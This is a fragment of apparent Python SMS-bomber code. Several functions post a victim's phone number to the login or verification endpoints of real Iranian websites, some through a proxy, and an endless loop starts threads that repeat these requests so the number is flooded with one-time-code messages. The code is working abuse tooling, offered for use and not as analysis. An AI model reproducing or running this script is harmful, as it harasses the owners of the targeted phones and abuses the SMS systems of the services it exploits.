...
def cha(phone):
	urla = "https://core.gapfilm.ir/api/v3.1/Account/Login"
	pya = {"phone":"0"+phone}
	try:
		reqaa = requests.post(urla,data=pya,proxies=proxy)
	except:
		print("eror")

def shah(phone):
	urlppc = "https://shahrfarsh.com/Account/Login"
	
	pyc ={"phoneNumber":"0"+phone}
	try:
		reqb = requests.post(urlppc,data=pyc,proxies=proxy)
	except:
		print("eror")
...
def asp(phone):
	irl = 'https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile'
	ipy = {"mobile":phone,"country_code":"+98"}
	
	try:
		rreq = requests.post(irl , data=ipy)
	except:
		print("eror")
...
while True :
	...
	Thread(target=cha, args=[phone]).start()
	Thread(target=asp, args=[phone]).start()
